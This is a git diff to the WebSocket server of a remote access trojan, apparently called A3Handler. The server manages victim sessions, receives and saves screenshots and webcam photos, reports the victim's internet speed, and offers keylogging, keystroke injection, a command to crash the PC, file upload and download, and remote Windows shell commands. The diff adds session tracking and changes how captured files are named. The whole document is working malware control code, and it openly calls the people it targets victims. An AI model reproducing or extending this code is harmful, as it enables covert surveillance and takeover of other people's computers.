@@ -14,6 +14,7 @@ var WebsocketErrorCodes = {
 "1009":"CLOSE_TOO_LARGE"
 };
 var workingDir = "";
+var lastWorkingDir = "";
 sessions = [];
 var filename = "";
 const wss = new WebSocket.Server({
@@ -60,8 +61,9 @@ wss.on('connection', function connection(ws) {
 		menu = false;
 		currentSession = lastSession;
 		console.log("[".bold + "+".green + "] Session ID : ".bold + currentSession);
+		lastWorkingDir = "";
 	}else{
-		console.log("[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
+		console.log("[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + ", client backgrounded as ID : ".bold + lastSession + " !".bold);
 	}
 	ws.on('message', function incoming(message) {
 		if(ws._socket.remoteAddress.replace("::ffff:", "") == sessions[currentSession].clientAddress){
@@ -91,22 +93,25 @@ wss.on('connection', function connection(ws) {
 					console.log("[".bold + "-".red + "] ".bold + message.replace("##ERROR##","").bold);
 			}else if (message.startsWith("hello")) {
 				workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
-				rl.setPrompt(workingDir + "> ");
-				rl.prompt();
+				if(lastWorkingDir == workingDir || lastWorkingDir == ""){
+					lastWorkingDir = workingDir;
+					rl.setPrompt(lastWorkingDir + "> ");
+					rl.prompt();
+				}
 			} else if (message.startsWith("##finish##")) {
 				ws.send("#pwd");
 			} else if (message.startsWith("##SCREENSHOT##")) {
 				var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
 				mkdirp('clients/' + sessions[currentSession].clientAddress + "/screenshots/", function(err) { 
-					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/screenshots/" + (new Date()).getDay() + ".png", base64Data, 'base64', function (err) {});
+					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/screenshots/" + (new Date()).getUTCDate() + "-" + parseInt(parseInt((new Date()).getUTCMonth()) + 1) + "-" + (new Date()).getUTCFullYear() + ".png", base64Data, 'base64', function (err) {});
 				});
 			}else if (message.startsWith("##SPEEDTEST##")) {
 				console.log("[".bold + "i".yellow + "] Victim's internet speed is ".bold + JSON.parse(message.replace("##SPEEDTEST##","")).speed.bold + "Mo/s !".bold);
 			}else if (message.startsWith("##WEBCAM_SNAP##")) {
 				console.log("[".bold + "+".blue + "] Photo received !".bold);
 				var base64Data = message.replace("##WEBCAM_SNAP##", "").replace(/^data:image\/png;base64,/, "");
-				mkdirp('webcam_snaps/' + sessions[currentSession].clientAddress + "/", function(err) { 
-					require("fs").writeFile('webcam_snaps/' + sessions[currentSession].clientAddress + "/" + Date.now() + ".jpeg", base64Data, 'base64', function (err) {});
+				mkdirp('clients/' + sessions[currentSession].clientAddress + "/webcam_snaps/", function(err) { 
+					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/webcam_snaps/" + (new Date()).getUTCDate() + "-" + parseInt(parseInt((new Date()).getUTCMonth()) + 1) + "-" + (new Date()).getUTCFullYear() + ".jpeg", base64Data, 'base64', function (err) {});
 				});
 			}else {
 				console.log(message.grey);
@@ -128,8 +133,8 @@ wss.on('connection', function connection(ws) {
 				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Unkown error code !".bold);
 			}
 			menu = true;
-			
 		}
+
 		delete sessions[findSessionNumber(ws, sessions)];
 		sessions.length -= 1;
 		rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
@@ -148,13 +153,14 @@ function findSessionNumber(SS, SE){
 }
 
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest sessions background get_user_infos keylogger sendkey ppal set_state list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest sessions background get_user_infos keylogger sendkey ppal set_state current list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
 
 rl.on('line', (line) => {
 	var msg = line.trim();
+	console.log("newLine");
 	if(!menu){
 		if (msg == "screenshot") {
 			console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
@@ -162,7 +168,10 @@ rl.on('line', (line) => {
 		} else if (msg == "speedtest") {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
-		} else if (msg.startsWith("sendkeys")) {
+		} else if (msg == "current") {
+			console.log("[".bold + "+".blue + "] Current session is : ".bold + currentSession);
+			rl.prompt();
+		}else if (msg.startsWith("sendkeys")) {
 			if(msg.split(' ').length > 1){
 				sessions[currentSession].send(msg);
 			}else{
@@ -280,6 +289,7 @@ rl.on('line', (line) => {
 			sessions[currentSession].send("help");
 		}else if(msg == "exit"){
 			console.log("[".bold + "+".green + "] Type ".bold + "background".bold.cyan + " if you want to leave this session, then type ".bold + "exit".bold.cyan + " to leave the program ! ".bold);
+			rl.prompt();
 		}else if(msg.startsWith("set_state")){
 			if(msg.split(" ").length == 2){
 				if(msg.split(" ")[1] == "sleeping"){
@@ -314,6 +324,7 @@ rl.on('line', (line) => {
 				if(sessions.hasOwnProperty(msg.split(" ")[2])){
 					currentSession = msg.split(" ")[2];
 					menu = false;
+					lastWorkingDir = "";
 					sessions[currentSession].send("SENDHELLO");
 				}else{
 					console.log("[".white + "-".red + "]".white + " Session ".red + msg.split(" ")[2].underline + " does not exist !".red);
